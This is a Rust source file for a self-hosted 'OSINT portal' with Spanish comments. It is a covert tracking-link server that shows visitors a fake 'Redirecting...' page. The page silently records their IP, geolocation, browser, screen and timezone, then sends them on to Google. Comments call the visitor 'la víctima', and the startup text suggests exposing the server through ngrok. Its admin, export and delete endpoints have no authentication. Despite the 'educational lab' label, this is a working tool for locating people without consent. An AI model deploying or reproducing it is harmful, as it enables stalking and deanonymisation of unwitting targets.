// =============================================================================
// NEXUS OSINT PORTAL v1.0
// =============================================================================
// Propósito: Servidor educativo para recolección de metadatos de visitantes
// Uso: Laboratorio de pentesting / OSINT en entorno controlado
// =============================================================================

use chrono::Utc;
use hyper::body::Incoming;
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use http_body_util::BodyExt;
use rusqlite::{params, Connection};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::Mutex;
use uuid::Uuid;

// ---------------------------------------------------------------------------
// Modelos de datos
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
struct VisitRecord {
    id: String,
    timestamp: String,
    ip_address: String,
    user_agent: String,
    country: String,
    city: String,
    isp: String,
    lat: f64,
    lon: f64,
    referer: String,
    language: String,
    os: String,
    browser: String,
    device: String,
    screen_resolution: String,
    timezone: String,
    cookies: String,
    redirect_url: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct GeoIpResponse {
    status: String,
    country: Option<String>,
    city: Option<String>,
    isp: Option<String>,
    lat: Option<f64>,
    lon: Option<f64>,
    query: Option<String>,
    org: Option<String>,
    region_name: Option<String>,
    timezone: Option<String>,
}

// ---------------------------------------------------------------------------
// Estado global de la aplicación
// ---------------------------------------------------------------------------

struct AppState {
    db: Connection,
    stats: Stats,
    config: PortalConfig,
}

#[derive(Debug, Clone, Serialize)]
struct Stats {
    total_visits: u64,
    unique_ips: Vec<String>,
    top_countries: Vec<(String, u64)>,
    top_browsers: Vec<(String, u64)>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PortalConfig {
    port: u16,
    redirect_url: String,
    admin_password: String,
}

impl Default for PortalConfig {
    fn default() -> Self {
        Self {
            port: 3000,
            redirect_url: "https://www.google.com".to_string(),
            admin_password: "nexus_admin".to_string(),
        }
    }
}

// ---------------------------------------------------------------------------
// Inicialización de base de datos
// ---------------------------------------------------------------------------

fn init_db(conn: &Connection) -> Result<(), rusqlite::Error> {
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS visits (
            id TEXT PRIMARY KEY,
            timestamp TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            lat REAL DEFAULT 0.0,
            lon REAL DEFAULT 0.0,
            referer TEXT,
            language TEXT,
            os TEXT,
            browser TEXT,
            device TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            cookies TEXT,
            redirect_url TEXT
        );

        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        );

        INSERT OR IGNORE INTO config (key, value) VALUES ('redirect_url', 'https://www.google.com');
        INSERT OR IGNORE INTO config (key, value) VALUES ('admin_password', 'nexus_admin');
        INSERT OR IGNORE INTO config (key, value) VALUES ('total_visits', '0');
        ",
    )?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Página principal de captura (la que ve la víctima)
// ---------------------------------------------------------------------------

fn gen_capture_html(visit_id: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>
<script>
// Capturar información del navegador y enviarla al servidor
(function() {{
    var xhr = new XMLHttpRequest();
    var data = JSON.stringify({{
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
        platform: navigator.platform || 'unknown',
        vendor: navigator.vendor || 'unknown'
    }});
    xhr.open('POST', '/collect/' + '{visit_id}', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(data);
}})();
window.location.href = '/redirect/{visit_id}';
</script>
<noscript>
<meta http-equiv="refresh" content="0; url=/redirect/{visit_id}">
</noscript>
</head>
<body>
<p>Redirecting...</p>
</body>
</html>"#,
        visit_id = visit_id
    )
}

// ---------------------------------------------------------------------------
// Análisis de User-Agent (básico)
// ---------------------------------------------------------------------------

fn parse_user_agent(ua: &str) -> (String, String, String) {
    // OS detection
    let os = if ua.contains("Windows NT 10") {
        "Windows 10/11"
    } else if ua.contains("Windows NT 6.3") {
        "Windows 8.1"
    } else if ua.contains("Windows NT 6.1") {
        "Windows 7"
    } else if ua.contains("Mac OS X") {
        "macOS"
    } else if ua.contains("iPhone") || ua.contains("iPad") {
        "iOS"
    } else if ua.contains("Android") {
        "Android"
    } else if ua.contains("Linux") && !ua.contains("Android") {
        "Linux"
    } else {
        "Unknown OS"
    }
    .to_string();

    // Browser detection
    let browser = if ua.contains("Firefox/") && !ua.contains("Seamonkey") {
        "Firefox"
    } else if ua.contains("Chrome/") && !ua.contains("Edg/") && !ua.contains("OPR/") {
        "Chrome"
    } else if ua.contains("Edg/") {
        "Edge"
    } else if ua.contains("Safari/") && !ua.contains("Chrome") {
        "Safari"
    } else if ua.contains("OPR/") || ua.contains("Opera") {
        "Opera"
    } else {
        "Unknown Browser"
    }
    .to_string();

    // Device detection
    let device = if ua.contains("iPhone") {
        "iPhone"
    } else if ua.contains("iPad") {
        "iPad"
    } else if ua.contains("Android") && ua.contains("Mobile") {
        "Android Phone"
    } else if ua.contains("Android") {
        "Android Tablet"
    } else {
        "Desktop"
    }
    .to_string();

    (os, browser, device)
}

// ---------------------------------------------------------------------------
// GeoIP lookup (vía ip-api.com)
// ---------------------------------------------------------------------------

async fn lookup_geo_ip(ip: &str) -> GeoIpResponse {
    // Si es IP local, no consultamos
    if ip == "127.0.0.1" || ip == "::1" || ip.starts_with("192.168.") || ip.starts_with("10.") {
        return GeoIpResponse {
            status: "local".to_string(),
            country: Some("Local Network".to_string()),
            city: Some("Lab".to_string()),
            isp: Some("Local".to_string()),
            lat: Some(0.0),
            lon: Some(0.0),
            query: Some(ip.to_string()),
            org: None,
            region_name: None,
            timezone: None,
        };
    }

    let url = format!("http://ip-api.com/json/{}?fields=status,country,city,isp,org,lat,lon,regionName,timezone,query", ip);
    match reqwest::get(&url).await {
        Ok(resp) => match resp.json::<GeoIpResponse>().await {
            Ok(geo) => geo,
            Err(_) => GeoIpResponse {
                status: "error".to_string(),
                ..Default::default()
            },
        },
        Err(_) => GeoIpResponse {
            status: "error".to_string(),
            ..Default::default()
        },
    }
}

impl Default for GeoIpResponse {
    fn default() -> Self {
        Self {
            status: "error".to_string(),
            country: None,
            city: None,
            isp: None,
            lat: None,
            lon: None,
            query: None,
            org: None,
            region_name: None,
            timezone: None,
        }
    }
}

// ---------------------------------------------------------------------------
// Handlers HTTP
// ---------------------------------------------------------------------------

async fn handle_request(
    req: Request<Incoming>,
    state: Arc<Mutex<AppState>>,
    client_ip: String,
) -> Result<Response<String>, hyper::Error> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();
    let headers = req.headers().clone();

    match (method, path.as_str()) {
        // -- Landing page (capture) --
        (_, "/") | (_, "/index.html") => {
            let visit_id = Uuid::new_v4().to_string();
            let ip_address = client_ip.clone();
            let user_agent = headers
                .get("user-agent")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("Unknown")
                .to_string();
            let referer = headers
                .get("referer")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            let language = headers
                .get("accept-language")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            let (os, browser, device) = parse_user_agent(&user_agent);

            // Geo-IP lookup
            let geo = lookup_geo_ip(&ip_address).await;

            let config = {
                let st = state.lock().await;
                st.config.clone()
            };

            let record = VisitRecord {
                id: visit_id.clone(),
                timestamp: Utc::now().format("%Y-%m-%d %H:%M:%S UTC").to_string(),
                ip_address: ip_address.clone(),
                user_agent: user_agent.clone(),
                country: geo.country.clone().unwrap_or_default(),
                city: geo.city.clone().unwrap_or_default(),
                isp: geo.isp.clone().unwrap_or_default(),
                lat: geo.lat.unwrap_or(0.0),
                lon: geo.lon.unwrap_or(0.0),
                referer,
                language: language.clone(),
                os: os.clone(),
                browser: browser.clone(),
                device: device.clone(),
                screen_resolution: "pending".to_string(),
                timezone: "pending".to_string(),
                cookies: "pending".to_string(),
                redirect_url: config.redirect_url.clone(),
            };

            // Guardar en DB
            {
                let st = state.lock().await;
                if let Err(e) = st.db.execute(
                    "INSERT INTO visits (id, timestamp, ip_address, user_agent, country, city, isp, lat, lon, referer, language, os, browser, device, redirect_url)
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?14, ?15)",
                    params![
                        record.id, record.timestamp, record.ip_address, record.user_agent,
                        record.country, record.city, record.isp, record.lat, record.lon,
                        record.referer, record.language, record.os, record.browser, record.device,
                        record.redirect_url
                    ],
                ) {
                    eprintln!("[ERROR] DB insert: {}", e);
                }
            }

            let html = gen_capture_html(&visit_id);
            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "text/html; charset=utf-8")
                .header("server", "NEXUS-OSINT/1.0")
                .body(html)
                .unwrap())
        }

        // -- Collect JS data (screen resolution, timezone) --
        (hyper::Method::POST, p) if p.starts_with("/collect/") => {
            let visit_id = p.strip_prefix("/collect/").unwrap_or("");
            let body = req.collect().await.map(|b| b.to_bytes()).unwrap_or_default();
            let js_data: serde_json::Value =
                serde_json::from_slice(&body).unwrap_or(serde_json::Value::Null);

            let screen = js_data
                .get("screen")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let timezone = js_data
                .get("timezone")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let _languages = js_data
                .get("languages")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let cookies = js_data
                .get("cookies")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");

            // Actualizar registro
            {
                let st = state.lock().await;
                let _ = st.db.execute(
                    "UPDATE visits SET screen_resolution = ?1, timezone = ?2, cookies = ?3 WHERE id = ?4",
                    params![screen, timezone, cookies, visit_id],
                );
            }

            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "application/json")
                .body("{\"status\":\"ok\"}".to_string())
                .unwrap())
        }

        // -- Redirect page --
        (_, p) if p.starts_with("/redirect/") => {
            let config = {
                let st = state.lock().await;
                st.config.clone()
            };
            Ok(Response::builder()
                .status(StatusCode::FOUND)
                .header("location", &config.redirect_url)
                .body(String::new())
                .unwrap())
        }

        // -- Admin dashboard --
        (_, "/admin") | (_, "/admin.html") => {
            let st = state.lock().await;
            let html = gen_admin_html(&st);
            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "text/html; charset=utf-8")
                .body(html)
                .unwrap())
        }

        // -- API: list visits (JSON) --
        (_, "/api/visits") => {
            let st = state.lock().await;
            let mut stmt = st
                .db
                .prepare("SELECT id, timestamp, ip_address, user_agent, country, city, isp, lat, lon, os, browser, device, screen_resolution, timezone FROM visits ORDER BY timestamp DESC LIMIT 100")
                .unwrap();
            let visits: Vec<serde_json::Value> = stmt
                .query_map([], |row| {
                    Ok(serde_json::json!({
                        "id": row.get::<_, String>(0)?,
                        "timestamp": row.get::<_, String>(1)?,
                        "ip": row.get::<_, String>(2)?,
                        "ua": row.get::<_, String>(3)?,
                        "country": row.get::<_, String>(4)?,
                        "city": row.get::<_, String>(5)?,
                        "isp": row.get::<_, String>(6)?,
                        "lat": row.get::<_, f64>(7)?,
                        "lon": row.get::<_, f64>(8)?,
                        "os": row.get::<_, String>(9)?,
                        "browser": row.get::<_, String>(10)?,
                        "device": row.get::<_, String>(11)?,
                        "screen": row.get::<_, String>(12)?,
                        "tz": row.get::<_, String>(13)?,
                    }))
                })
                .unwrap()
                .filter_map(|r| r.ok())
                .collect();

            let json = serde_json::json!({
                "total": visits.len(),
                "visits": visits
            });

            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "application/json")
                .header("access-control-allow-origin", "*")
                .body(json.to_string())
                .unwrap())
        }

        // -- API: stats --
        (_, "/api/stats") => {
            let st = state.lock().await;
            let total: u64 = st
                .db
                .query_row("SELECT COUNT(*) FROM visits", [], |row| row.get(0))
                .unwrap_or(0);

            let unique_ips: Vec<String> = st
                .db
                .prepare("SELECT DISTINCT ip_address FROM visits")
                .unwrap()
                .query_map([], |row| row.get::<_, String>(0))
                .unwrap()
                .filter_map(|r| r.ok())
                .collect();

            let json = serde_json::json!({
                "total_visits": total,
                "unique_ips": unique_ips.len(),
                "ips": unique_ips
            });

            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "application/json")
                .body(json.to_string())
                .unwrap())
        }

        // -- Admin: clear all data --
        (_, "/admin/clear") => {
            let st = state.lock().await;
            let _ = st.db.execute("DELETE FROM visits", []);
            Ok(Response::builder()
                .status(StatusCode::FOUND)
                .header("location", "/admin")
                .body(String::new())
                .unwrap())
        }

        // -- Admin: export CSV --
        (_, "/admin/export.csv") => {
            let st = state.lock().await;
            let mut stmt = st
                .db
                .prepare("SELECT timestamp, ip_address, country, city, isp, os, browser, device, screen_resolution, user_agent FROM visits ORDER BY timestamp DESC")
                .unwrap();
            let rows: Vec<String> = stmt
                .query_map([], |row| {
                    Ok(format!(
                        "{},{},{},{},{},{},{},{},{},\"{}\"",
                        row.get::<_, String>(0)?,
                        row.get::<_, String>(1)?,
                        row.get::<_, String>(2)?,
                        row.get::<_, String>(3)?,
                        row.get::<_, String>(4)?,
                        row.get::<_, String>(5)?,
                        row.get::<_, String>(6)?,
                        row.get::<_, String>(7)?,
                        row.get::<_, String>(8)?,
                        row.get::<_, String>(9)?,
                    ))
                })
                .unwrap()
                .filter_map(|r| r.ok())
                .collect();

            let mut csv = "timestamp,ip,country,city,isp,os,browser,device,screen,user_agent\n".to_string();
            csv.push_str(&rows.join("\n"));

            Ok(Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "text/csv")
                .header("content-disposition", "attachment; filename=nexus_osint_data.csv")
                .body(csv)
                .unwrap())
        }

        // -- 404 --
        _ => {
            let body = "<h1>NEXUS OSINT Portal</h1><p>Endpoint not found. <a href='/'>Home</a></p>";
            Ok(Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(body.to_string())
                .unwrap())
        }
    }
}

// ---------------------------------------------------------------------------
// Admin dashboard HTML
// ---------------------------------------------------------------------------

fn gen_admin_html(state: &AppState) -> String {
    let total: u64 = state
        .db
        .query_row("SELECT COUNT(*) FROM visits", [], |row| row.get(0))
        .unwrap_or(0);

    let unique_ips: Vec<String> = state
        .db
        .prepare("SELECT DISTINCT ip_address FROM visits")
        .unwrap()
        .query_map([], |row| row.get::<_, String>(0))
        .unwrap()
        .filter_map(|r| r.ok())
        .collect();

    let redirect_url = &state.config.redirect_url;
    let port = state.config.port;

    format!(
        r#"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NEXUS OSINT Portal - Admin</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0f; color: #e0e0e0; }}
.container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
h1 {{ color: #00ff88; font-size: 1.8rem; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0,255,136,0.3); }}
.subtitle {{ color: #888; margin-bottom: 30px; font-size: 0.9rem; }}
.stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }}
.stat-card {{ background: #14141f; border: 1px solid #2a2a3a; border-radius: 8px; padding: 20px; }}
.stat-card h3 {{ color: #666; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }}
.stat-card .value {{ color: #00ff88; font-size: 2rem; font-weight: bold; }}
.stat-card p {{ color: #888; font-size: 0.8rem; margin-top: 5px; }}
table {{ width: 100%; border-collapse: collapse; background: #14141f; border-radius: 8px; overflow: hidden; }}
th {{ background: #1a1a2e; color: #00ff88; padding: 12px 15px; text-align: left; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; }}
td {{ padding: 10px 15px; border-bottom: 1px solid #2a2a3a; font-size: 0.85rem; }}
tr:hover {{ background: #1a1a2e; }}
.flag {{ font-size: 1.2rem; }}
a {{ color: #00aaff; text-decoration: none; }}
a:hover {{ text-decoration: underline; }}
.actions {{ margin: 20px 0; display: flex; gap: 10px; }}
.btn {{ background: #2a2a3a; color: #e0e0e0; padding: 8px 16px; border-radius: 4px; text-decoration: none; font-size: 0.85rem; }}
.btn:hover {{ background: #3a3a5a; text-decoration: none; }}
.btn-danger {{ background: #5a1a1a; color: #ff4444; }}
.btn-danger:hover {{ background: #7a2a2a; }}
.link-box {{ background: #14141f; border: 1px solid #2a2a3a; border-radius: 8px; padding: 15px; margin-bottom: 20px; }}
.link-box code {{ color: #00ff88; font-size: 1.1rem; }}
.link-box .label {{ color: #666; font-size: 0.8rem; }}
</style>
</head>
<body>
<div class="container">
    <h1>🔍 NEXUS OSINT Portal</h1>
    <p class="subtitle">Panel de control - Datos capturados en tiempo real</p>

    <div class="link-box">
        <div class="label">🌐 TU ENLACE DE CAPTURA</div>
        <code>http://TU_IP_PUBLICA:{port}/</code>
        <div style="margin-top:8px;font-size:0.8rem;color:#666;">
            Redirige a: <span style="color:#00aaff;">{redirect_url}</span>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <h3>Visitas totales</h3>
            <div class="value">{total}</div>
        </div>
        <div class="stat-card">
            <h3>IPs únicas</h3>
            <div class="value">{}</div>
            <p>{}</p>
        </div>
        <div class="stat-card">
            <h3>Puerto</h3>
            <div class="value">{}</div>
        </div>
    </div>

    <div class="actions">
        <a href="/" class="btn">🏠 Landing Page</a>
        <a href="/api/visits" class="btn">📄 API JSON</a>
        <a href="/admin/export.csv" class="btn">📥 Exportar CSV</a>
        <a href="/admin/clear" class="btn btn-danger" onclick="return confirm('¿Borrar todos los datos?')">🗑️ Limpiar Todo</a>
    </div>

    <table id="visits-table">
        <thead>
            <tr>
                <th>Hora</th>
                <th>IP</th>
                <th>País</th>
                <th>Ciudad</th>
                <th>ISP</th>
                <th>OS</th>
                <th>Browser</th>
                <th>Dispositivo</th>
                <th>Pantalla</th>
                <th>UA</th>
            </tr>
        </thead>
        <tbody id="visits-body">
            <tr><td colspan="10" style="text-align:center;color:#666;">Cargando...</td></tr>
        </tbody>
    </table>
</div>

<script>
function loadVisits() {{
    fetch('/api/visits')
        .then(r => r.json())
        .then(data => {{
            const tbody = document.getElementById('visits-body');
            if (!data.visits || data.visits.length === 0) {{
                tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;color:#666;">Sin visitas aún</td></tr>';
                return;
            }}
            tbody.innerHTML = data.visits.map(v => {{
                const flag = v.country ? getFlag(v.country) : '';
                return `<tr>
                    <td>${{v.timestamp.replace(' UTC', '')}}</td>
                    <td><code>${{v.ip}}</code></td>
                    <td>${{flag}} ${{v.country}}</td>
                    <td>${{v.city}}</td>
                    <td style="font-size:0.75rem;">${{v.isp.substring(0,25)}}</td>
                    <td>${{v.os}}</td>
                    <td>${{v.browser}}</td>
                    <td>${{v.device}}</td>
                    <td>${{v.screen}}</td>
                    <td style="font-size:0.7rem;color:#666;" title="${{v.ua}}">${{v.ua.substring(0,25)}}...</td>
                </tr>`;
            }}).join('');
        }})
        .catch(err => {{
            document.getElementById('visits-body').innerHTML = '<tr><td colspan="10" style="text-align:center;color:#ff4444;">Error cargando datos</td></tr>';
        }});
}}

function getFlag(country) {{
    const flags = {{
        'Argentina': '🇦🇷', 'Bolivia': '🇧🇴', 'Brazil': '🇧🇷',
        'Paraguay': '🇵🇾', 'Uruguay': '🇺🇾', 'Chile': '🇨🇱',
        'Colombia': '🇨🇴', 'Ecuador': '🇪🇨', 'Peru': '🇵🇪',
        'Venezuela': '🇻🇪', 'Mexico': '🇲🇽', 'Spain': '🇪🇸',
        'United States': '🇺🇸', 'France': '🇫🇷', 'Germany': '🇩🇪',
        'Italy': '🇮🇹', 'United Kingdom': '🇬🇧', 'Russia': '🇷🇺',
        'China': '🇨🇳', 'Japan': '🇯🇵', 'South Korea': '🇰🇷',
        'Australia': '🇦🇺', 'Canada': '🇨🇦',
    }};
    return flags[country] || '🏳️';
}}

loadVisits();
setInterval(loadVisits, 5000);
</script>
</body>
</html>"#,
        unique_ips.len(),
        unique_ips.join(", "),
        port
    )
}

// ---------------------------------------------------------------------------
// Main - Punto de entrada
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() {
    println!("╔══════════════════════════════════════════════════╗");
    println!("║     🔍 NEXUS OSINT PORTAL v1.0                  ║");
    println!("║     Laboratorio de Recolección de Metadatos     ║");
    println!("╚══════════════════════════════════════════════════╝");
    println!();

    // Cargar configuración
    let config = PortalConfig::default();

    // Inicializar base de datos
    let db_path = "nexus_osint.db";
    let conn = Connection::open(db_path).expect("Failed to open database");
    init_db(&conn).expect("Failed to initialize database");

    let state = Arc::new(Mutex::new(AppState {
        db: conn,
        stats: Stats {
            total_visits: 0,
            unique_ips: vec![],
            top_countries: vec![],
            top_browsers: vec![],
        },
        config: config.clone(),
    }));

    // Iniciar servidor
    let addr: SocketAddr = ([0, 0, 0, 0], config.port).into();
    let listener = TcpListener::bind(addr).await.expect("Failed to bind port");

    println!("  📡 Servidor escuchando en: http://0.0.0.0:{}/", config.port);
    println!("  🎯 Landing page:         http://0.0.0.0:{}/", config.port);
    println!("  🔐 Admin dashboard:      http://0.0.0.0:{}/admin", config.port);
    println!("  📊 API:                  http://0.0.0.0:{}/api/visits", config.port);
    println!("  📥 CSV export:           http://0.0.0.0:{}/admin/export.csv", config.port);
    println!();
    println!("  ⚡ Para exponer a internet (ngrok):");
    println!("      ngrok http {}", config.port);
    println!();
    println!("  📁 Base de datos: {}", db_path);
    println!();

    loop {
        let (stream, client_addr) = listener.accept().await.unwrap();
        let state = state.clone();
        let client_ip = client_addr.ip().to_string();

        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let service = service_fn(move |req| {
                handle_request(req, state.clone(), client_ip.clone())
            });

            if let Err(err) = http1::Builder::new()
                .keep_alive(true)
                .serve_connection(io, service)
                .await
            {
                eprintln!("[ERROR] Connection: {}", err);
            }
        });
    }
}
